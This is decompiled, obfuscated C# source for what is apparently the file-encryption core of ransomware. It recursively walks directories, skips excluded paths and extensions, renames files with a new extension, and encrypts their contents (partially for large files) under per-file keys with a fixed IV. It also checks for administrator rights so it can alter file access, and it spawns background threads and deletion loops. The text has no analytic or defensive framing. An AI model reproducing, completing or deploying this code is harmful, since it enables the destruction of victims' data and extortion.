using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using frOTHhWhveFli;

namespace maXgRZLUwUwi;

internal sealed class dVGeYGcQgLS
{
	public sealed class BhOrqkZFsFPOr
	{
		private static StringCollection HjVZpdEbeQbwhBn;

		private static List<string> jBvlRBhzcWmXK;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107408011));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107408006)) && !text.ToLower().Contains(getString_0(107408465)) && !text.ToLower().Contains(getString_0(107393094)) && !text.ToLower().Contains(getString_0(107393049)) && !text.ToLower().Contains(getString_0(107408484)) && !text.ToLower().Contains(getString_0(107392929)) && !text.ToLower().Contains(getString_0(107392358)) && !text.ToLower().Contains(getString_0(107392309)) && !text.ToLower().Contains(getString_0(107392324)) && !text.ToLower().Contains(getString_0(107392275)) && !text.ToLower().Contains(getString_0(107392241)) && !text.ToLower().Contains(getString_0(107392256)) && !text.ToLower().Contains(getString_0(107392207)) && !text.ToLower().Contains(getString_0(107392226)) && !text.ToLower().Contains(getString_0(107392205)) && !text.ToLower().Contains(getString_0(107392192)) && !text.ToLower().Contains(getString_0(107392147)) && !text.ToLower().Contains(getString_0(107392162)) && !text.ToLower().Contains(getString_0(107392113)) && !text.Contains(KPabEeiJZVewrU(getString_0(107392128))) && !text.Contains(getString_0(107392615)) && !text.Contains(getString_0(107392585)) && !text.EndsWith(getString_0(107395956)) && !text.EndsWith(getString_0(107392528)) && !text.EndsWith(getString_0(107392555)) && !text.EndsWith(getString_0(107392550)) && !text.EndsWith(getString_0(107392545)) && !text.ToLower().Contains(getString_0(107392508)) && !text.ToLower().Contains(ndkamOclOKnVzv))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(RECKTQkVejAGfc) * 1024.0 * 1024.0 && MDZDXHRjkgrJzWk == getString_0(107396934))
							{
								jBvlRBhzcWmXK.Add(text);
							}
							else if (File.Exists(text) && MDZDXHRjkgrJzWk == getString_0(107396939))
							{
								jBvlRBhzcWmXK.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return jBvlRBhzcWmXK;
		}

		static BhOrqkZFsFPOr()
		{
			Strings.CreateGetStringDelegate(typeof(BhOrqkZFsFPOr));
			HjVZpdEbeQbwhBn = new StringCollection();
			jBvlRBhzcWmXK = new List<string>();
		}
	}

	private sealed class pmaItEcijum
	{
		public string BefoimJsrvHKixL;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == BefoimJsrvHKixL;
		}
	}

	private sealed class BEYZTKrfdviwxZ
	{
		private sealed class BojFrVelCC
		{
			public BEYZTKrfdviwxZ lanKrwDoiYXSIJD;

			public string aXbGoXsatjVtvQD;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					MLWevbAvFShYk(WindowsIdentity.GetCurrent().Name, aXbGoXsatjVtvQD);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				bLvLMeOXtJfdOedzV(aXbGoXsatjVtvQD, lanKrwDoiYXSIJD.vGyfTCQGiQXjw, lanKrwDoiYXSIJD.tAjZyCLwpakJwKs, lanKrwDoiYXSIJD.HEeqUjcHYAUs, lanKrwDoiYXSIJD.lOtlwlSuLOi);
			}
		}

		public string[] vGyfTCQGiQXjw;

		public string[] HEeqUjcHYAUs;

		public string lOtlwlSuLOi;

		public string tAjZyCLwpakJwKs;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			BojFrVelCC CS_0024_003C_003E8__locals0 = new BojFrVelCC();
			CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD = this;
			CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD = string_0;
			if (wvpBCFJLeJ && !NvfCSlJqoNa().Contains(getString_0(107390618)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						MLWevbAvFShYk(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (uJRCtLGzhdwU == getString_0(107396940))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					bLvLMeOXtJfdOedzV(CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.vGyfTCQGiQXjw, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.tAjZyCLwpakJwKs, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.HEeqUjcHYAUs, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.lOtlwlSuLOi);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				bLvLMeOXtJfdOedzV(CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD, vGyfTCQGiQXjw, tAjZyCLwpakJwKs, HEeqUjcHYAUs, lOtlwlSuLOi);
			}
		}

		static BEYZTKrfdviwxZ()
		{
			Strings.CreateGetStringDelegate(typeof(BEYZTKrfdviwxZ));
		}
	}

	private sealed class ZrUPQFEbZMm
	{
		private sealed class myOmNLpmgvB
		{
			public ZrUPQFEbZMm FEColPUvAKhOS;

			public string ngsQJurIby;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in izJuaPEIDwBM)
				{
					if (ngsQJurIby.ToLower().EndsWith(item + FEColPUvAKhOS.rASsmHWKxhVCSQ) && IxktWyCSAKdLJt == getString_0(107396951))
					{
						if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > new FileInfo(ngsQJurIby).Length)
						{
							try
							{
								pkkGXNrkowS.XVoGcXcserch(getString_0(107393503), getString_0(107393498), getString_0(107393453), ngsQJurIby);
							}
							catch
							{
							}
						}
					}
					else if (ngsQJurIby.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396956))
					{
						try
						{
							pkkGXNrkowS.XVoGcXcserch(getString_0(107393503), getString_0(107393498), getString_0(107393453), ngsQJurIby);
						}
						catch
						{
						}
					}
				}
			}

			static myOmNLpmgvB()
			{
				Strings.CreateGetStringDelegate(typeof(myOmNLpmgvB));
			}
		}

		private sealed class mCwVmPeEvIdE
		{
			public ZrUPQFEbZMm FEColPUvAKhOS;

			public string JWmPEXtTPXJlooB;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in izJuaPEIDwBM)
				{
					if (JWmPEXtTPXJlooB.ToLower().EndsWith(item + FEColPUvAKhOS.rASsmHWKxhVCSQ) && IxktWyCSAKdLJt == getString_0(107396954))
					{
						if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > new FileInfo(JWmPEXtTPXJlooB).Length)
						{
							try
							{
								pkkGXNrkowS.XVoGcXcserch(getString_0(107393506), getString_0(107393501), getString_0(107393456), JWmPEXtTPXJlooB);
							}
							catch
							{
							}
						}
					}
					else if (JWmPEXtTPXJlooB.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396959))
					{
						try
						{
							pkkGXNrkowS.XVoGcXcserch(getString_0(107393506), getString_0(107393501), getString_0(107393456), JWmPEXtTPXJlooB);
						}
						catch
						{
						}
					}
				}
			}

			static mCwVmPeEvIdE()
			{
				Strings.CreateGetStringDelegate(typeof(mCwVmPeEvIdE));
			}
		}

		public List<string> jwPdYfuGxOuj;

		public List<string> nuiJQynaikoWe;

		public string rASsmHWKxhVCSQ;

		public string[] LZlHAkhSddj;

		public string zVrwuHAUxLyay;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			myOmNLpmgvB CS_0024_003C_003E8__locals0;
			foreach (string item in nuiJQynaikoWe)
			{
				if (LZlHAkhSddj.Length != 0)
				{
					string[] lZlHAkhSddj = LZlHAkhSddj;
					int num = 0;
					while (num < lZlHAkhSddj.Length)
					{
						string value = lZlHAkhSddj[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(rASsmHWKxhVCSQ))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || faYAKmARedHa.Contains(item))
				{
					continue;
				}
				if (peJAFtAqyTg == getString_0(107396948))
				{
					try
					{
						if (AAOVWQPBaJGzX.JKXMmHfBbDap(item))
						{
							AAOVWQPBaJGzX.kBsTntFlGOZl(item);
						}
					}
					catch
					{
					}
				}
				faYAKmARedHa.Add(item);
				if (!eWoKDGBNuJT.Contains(Path.GetDirectoryName(item)))
				{
					eWoKDGBNuJT.Add(Path.GetDirectoryName(item));
				}
				zWOwTEpvFVcem(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (IyKNhTqRuk)
						{
							try
							{
								File.AppendAllText(AJkkstCArH, getString_0(107390760) + item + getString_0(107408449) + ex2.Message + getString_0(107396262));
							}
							catch (Exception)
							{
							}
						}
						LuhgDZXWifkSE++;
						goto end_IL_00ee;
					}
					if (sxiybUGjmYR == getString_0(107396948) && new FileInfo(item).Length > Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024 && !jwPdYfuGxOuj.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new myOmNLpmgvB();
						CS_0024_003C_003E8__locals0.FEColPUvAKhOS = this;
						try
						{
							if (rASsmHWKxhVCSQ != getString_0(107391020))
							{
								if (yemgLyczOOW)
								{
									rASsmHWKxhVCSQ = htotHetAeUsCN + rASsmHWKxhVCSQ;
								}
								File.Move(item, item + rASsmHWKxhVCSQ);
							}
						}
						catch (Exception ex4)
						{
							if (IyKNhTqRuk)
							{
								try
								{
									File.AppendAllText(AJkkstCArH, getString_0(107390760) + item + getString_0(107408388) + ex4.Message + getString_0(107396262));
								}
								catch (Exception)
								{
								}
							}
							LuhgDZXWifkSE++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.ngsQJurIby = getString_0(107392875);
						if (rASsmHWKxhVCSQ != getString_0(107391020))
						{
							CS_0024_003C_003E8__locals0.ngsQJurIby = item + rASsmHWKxhVCSQ;
						}
						else
						{
							CS_0024_003C_003E8__locals0.ngsQJurIby = item;
						}
						if (LZOxaUWpmIj == getString_0(107396948))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in izJuaPEIDwBM)
								{
									if (CS_0024_003C_003E8__locals0.ngsQJurIby.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.FEColPUvAKhOS.rASsmHWKxhVCSQ) && IxktWyCSAKdLJt == myOmNLpmgvB.getString_0(107396951))
									{
										if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ngsQJurIby).Length)
										{
											try
											{
												pkkGXNrkowS.XVoGcXcserch(myOmNLpmgvB.getString_0(107393503), myOmNLpmgvB.getString_0(107393498), myOmNLpmgvB.getString_0(107393453), CS_0024_003C_003E8__locals0.ngsQJurIby);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.ngsQJurIby.ToLower().EndsWith(item2) && IxktWyCSAKdLJt == myOmNLpmgvB.getString_0(107396956))
									{
										try
										{
											pkkGXNrkowS.XVoGcXcserch(myOmNLpmgvB.getString_0(107393503), myOmNLpmgvB.getString_0(107393498), myOmNLpmgvB.getString_0(107393453), CS_0024_003C_003E8__locals0.ngsQJurIby);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
						string s = cEUhIAxhKY.KMmlqOtzJnQsiYY(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = stgsEAeFeTEw.aSuXlLtwWpA(CS_0024_003C_003E8__locals0.ngsQJurIby, Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024);
						stgsEAeFeTEw.HkuHIkbrpjRy(zVTmHFmLlT: (!USeABfWDSTq) ? (lPNPDgvBRE ? stgsEAeFeTEw.lnSkBnMZylaQj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : stgsEAeFeTEw.lnSkBnMZylaQj(byte_, Encoding.ASCII.GetBytes(zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (lPNPDgvBRE ? JMNtsrAVumpK.xvIWmLmXVwDAe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JMNtsrAVumpK.xvIWmLmXVwDAe(byte_, Encoding.ASCII.GetBytes(zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), tevOmFuhLjKBF: CS_0024_003C_003E8__locals0.ngsQJurIby, wAHvXFtGoVAD: bytes);
					}
					else
					{
						if (yemgLyczOOW)
						{
							rASsmHWKxhVCSQ = htotHetAeUsCN + rASsmHWKxhVCSQ;
						}
						string text2 = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
						string s2 = cEUhIAxhKY.KMmlqOtzJnQsiYY(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (rASsmHWKxhVCSQ != getString_0(107391020))
						{
							if (!NHbEtBQcjaHtXtG)
							{
								if (!lPNPDgvBRE)
								{
									DZFNNITCWrKC(item, item + rASsmHWKxhVCSQ, baXqehWULBIGBE);
								}
								else
								{
									DZFNNITCWrKC(item, item + rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!lPNPDgvBRE)
									{
										XozvpxrYexO(item, item + rASsmHWKxhVCSQ, baXqehWULBIGBE);
									}
									else
									{
										XozvpxrYexO(item, item + rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (IyKNhTqRuk)
									{
										try
										{
											File.AppendAllText(AJkkstCArH, getString_0(107390760) + item + getString_0(107391006) + ex6.Message + getString_0(107396262));
										}
										catch (Exception)
										{
										}
									}
									LuhgDZXWifkSE++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!NHbEtBQcjaHtXtG)
						{
							if (!lPNPDgvBRE)
							{
								DZFNNITCWrKC(item, item + getString_0(107391015), baXqehWULBIGBE);
							}
							else
							{
								DZFNNITCWrKC(item, item + getString_0(107391015), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!lPNPDgvBRE)
								{
									XozvpxrYexO(item, item, baXqehWULBIGBE);
								}
								else
								{
									XozvpxrYexO(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (IyKNhTqRuk)
								{
									try
									{
										File.AppendAllText(AJkkstCArH, getString_0(107390760) + item + getString_0(107391006) + ex8.Message + getString_0(107396262));
									}
									catch (Exception)
									{
									}
								}
								LuhgDZXWifkSE++;
								goto end_IL_00ee;
							}
						}
						if (lPNPDgvBRE)
						{
							if (rASsmHWKxhVCSQ != getString_0(107391020))
							{
								lbMOCvnhGJaBCrXH(item + rASsmHWKxhVCSQ, bytes2);
							}
							else
							{
								lbMOCvnhGJaBCrXH(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				nuiJQynaikoWe.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			mCwVmPeEvIdE CS_0024_003C_003E8__locals0 = new mCwVmPeEvIdE();
			CS_0024_003C_003E8__locals0.FEColPUvAKhOS = this;
			CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB = string_0;
			if (LZlHAkhSddj.Length != 0)
			{
				string[] lZlHAkhSddj = LZlHAkhSddj;
				int num = 0;
				while (num < lZlHAkhSddj.Length)
				{
					string value = lZlHAkhSddj[num];
					if (!CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.EndsWith(rASsmHWKxhVCSQ))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!faYAKmARedHa.Contains(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB))
			{
				if (peJAFtAqyTg == getString_0(107396948))
				{
					try
					{
						if (AAOVWQPBaJGzX.JKXMmHfBbDap(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB))
						{
							AAOVWQPBaJGzX.kBsTntFlGOZl(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
						}
					}
					catch
					{
					}
				}
				faYAKmARedHa.Add(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
				if (!eWoKDGBNuJT.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB)))
				{
					eWoKDGBNuJT.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB));
				}
				zWOwTEpvFVcem(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (IyKNhTqRuk)
						{
							try
							{
								File.AppendAllText(AJkkstCArH, getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + getString_0(107408449) + ex2.Message + getString_0(107396262));
							}
							catch (Exception)
							{
							}
						}
						LuhgDZXWifkSE++;
						goto end_IL_0117_2;
					}
					if (sxiybUGjmYR == getString_0(107396948) && new FileInfo(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB).Length > Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024)
					{
						try
						{
							if (rASsmHWKxhVCSQ != getString_0(107391020))
							{
								if (yemgLyczOOW)
								{
									rASsmHWKxhVCSQ = htotHetAeUsCN + rASsmHWKxhVCSQ;
								}
								File.Move(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + rASsmHWKxhVCSQ);
							}
						}
						catch (Exception ex4)
						{
							if (IyKNhTqRuk)
							{
								try
								{
									File.AppendAllText(AJkkstCArH, getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + getString_0(107408388) + ex4.Message + getString_0(107396262));
								}
								catch (Exception)
								{
								}
							}
							LuhgDZXWifkSE++;
							return;
						}
						if (rASsmHWKxhVCSQ != getString_0(107391020))
						{
							CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB += rASsmHWKxhVCSQ;
						}
						if (LZOxaUWpmIj == getString_0(107396948))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in izJuaPEIDwBM)
								{
									if (CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.FEColPUvAKhOS.rASsmHWKxhVCSQ) && IxktWyCSAKdLJt == mCwVmPeEvIdE.getString_0(107396954))
									{
										if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB).Length)
										{
											try
											{
												pkkGXNrkowS.XVoGcXcserch(mCwVmPeEvIdE.getString_0(107393506), mCwVmPeEvIdE.getString_0(107393501), mCwVmPeEvIdE.getString_0(107393456), CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.ToLower().EndsWith(item) && IxktWyCSAKdLJt == mCwVmPeEvIdE.getString_0(107396959))
									{
										try
										{
											pkkGXNrkowS.XVoGcXcserch(mCwVmPeEvIdE.getString_0(107393506), mCwVmPeEvIdE.getString_0(107393501), mCwVmPeEvIdE.getString_0(107393456), CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
						string s = cEUhIAxhKY.KMmlqOtzJnQsiYY(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = stgsEAeFeTEw.aSuXlLtwWpA(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024);
						stgsEAeFeTEw.HkuHIkbrpjRy(zVTmHFmLlT: (!USeABfWDSTq) ? (lPNPDgvBRE ? stgsEAeFeTEw.lnSkBnMZylaQj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : stgsEAeFeTEw.lnSkBnMZylaQj(byte_, Encoding.ASCII.GetBytes(zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (lPNPDgvBRE ? JMNtsrAVumpK.xvIWmLmXVwDAe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JMNtsrAVumpK.xvIWmLmXVwDAe(byte_, Encoding.ASCII.GetBytes(zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), tevOmFuhLjKBF: CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, wAHvXFtGoVAD: bytes);
					}
					else
					{
						if (yemgLyczOOW)
						{
							rASsmHWKxhVCSQ = htotHetAeUsCN + rASsmHWKxhVCSQ;
						}
						string text2 = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
						string s2 = cEUhIAxhKY.KMmlqOtzJnQsiYY(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (rASsmHWKxhVCSQ != getString_0(107391020))
						{
							if (!NHbEtBQcjaHtXtG)
							{
								if (!lPNPDgvBRE)
								{
									DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + rASsmHWKxhVCSQ, baXqehWULBIGBE);
								}
								else
								{
									DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!lPNPDgvBRE)
									{
										XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + rASsmHWKxhVCSQ, baXqehWULBIGBE);
									}
									else
									{
										XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (IyKNhTqRuk)
									{
										try
										{
											File.AppendAllText(AJkkstCArH, getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + getString_0(107391006) + ex6.Message + getString_0(107396262));
										}
										catch (Exception)
										{
										}
									}
									LuhgDZXWifkSE++;
									return;
								}
							}
						}
						else if (!NHbEtBQcjaHtXtG)
						{
							if (!lPNPDgvBRE)
							{
								DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + getString_0(107391015), baXqehWULBIGBE);
							}
							else
							{
								DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + getString_0(107391015), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!lPNPDgvBRE)
								{
									XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, baXqehWULBIGBE);
								}
								else
								{
									XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (IyKNhTqRuk)
								{
									try
									{
										File.AppendAllText(AJkkstCArH, getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + getString_0(107391006) + ex8.Message + getString_0(107396262));
									}
									catch (Exception)
									{
									}
								}
								LuhgDZXWifkSE++;
								return;
							}
						}
						if (lPNPDgvBRE)
						{
							if (rASsmHWKxhVCSQ != getString_0(107391020))
							{
								lbMOCvnhGJaBCrXH(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + rASsmHWKxhVCSQ, bytes2);
							}
							else
							{
								lbMOCvnhGJaBCrXH(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			nuiJQynaikoWe.Remove(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
		}

		static ZrUPQFEbZMm()
		{
			Strings.CreateGetStringDelegate(typeof(ZrUPQFEbZMm));
		}
	}

	private sealed class zSedGxXyDlWpe
	{
		public string UsQJhhXoKCoNs;

		public string ugLXUrkSgjk;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(UsQJhhXoKCoNs);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(ugLXUrkSgjk))
					{
						File.Delete(ugLXUrkSgjk);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string bYxBeUFQrvjc;

	public static byte[] baXqehWULBIGBE;

	public static string MDZDXHRjkgrJzWk;

	public static string RECKTQkVejAGfc;

	public static List<string> SRFEGlkoeiER;

	public static List<string> wfSQRNJNpIsCV;

	public static string gETRgNgBKYX;

	public static string zVrwuHAUxLyay;

	public static string tjcGwWrURUFJ;

	public static string eBqVrsmuLSGvlL;

	public static int KYeUqtAhrujU;

	public static string peJAFtAqyTg;

	public static string ugDAsDtkIuFHI;

	public static string sermcGnhtRVId;

	public static string wgVMZrFOOvZlc;

	public static string ecaBMUkRPghLrn;

	public static string RmvrrDiHwaeP;

	public static string XTrbCENWNoq;

	public static string rwgmXYownudC;

	public static List<string> PtQdinOAWGzwYsV;

	public static List<string> eWoKDGBNuJT;

	public static string JGbxJAwTqf;

	public static string YrItydhffRwf;

	public static string VEHjAqFVZrQcijAI;

	public static List<string> faYAKmARedHa;

	public static string DOzTZyFxEotdrJ;

	private static string wQjfgLhqCXKC;

	public static string uJRCtLGzhdwU;

	public static string iCwSUTiSSBL;

	public static List<string> WWPgOUxUtifS;

	public static List<string> WjOvnLHSLKhV;

	public static List<string> ZSYMvlDWxYEtJZO;

	public static List<string> bverOuZzCjzkYh;

	public static string LABFsmtCCegTkuJ;

	public static List<string> cIDpbJJYzpDACkyZ;

	public static List<string> zziMgJgWEnmo;

	public static string XtJDIFKdBObFiw;

	public static string EXDBcCojQQvCl;

	internal static DateTime bpInvtMjNHqeLp;

	internal static DateTime tGMUsFQXYBMSN;

	public static string sxiybUGjmYR;

	public static string ddqPQmPoIWuW;

	public static string PslbkyAstfhCvy;

	public static string tmCVPqkAAjA;

	public static string guhyIlZJDhBff;

	public static string SGqxsgTFYyviwIq;

	public static string HTzSscqOJXN;

	public static string LZOxaUWpmIj;

	public static List<string> izJuaPEIDwBM;

	public static string IxktWyCSAKdLJt;

	public static string kyMVozVHGsuV;

	public static string nBBaMBwclRdY;

	public static string eLAKMpocHKWXQA;

	public static string wxfzHyrcJlhzsh;

	public static string mxdlyhKIDSTRaTYm;

	public static string jlIrvgyvehPHe;

	public static string zpvKPwOvMg;

	public static string iEaWQONmdzBb;

	public static string UdJFCQjIIgDVCcJx;

	public static string FtYCpnUUMTIV;

	public static string lOlLtOMnnINKpPby;

	public static string qUeurzogGuEr;

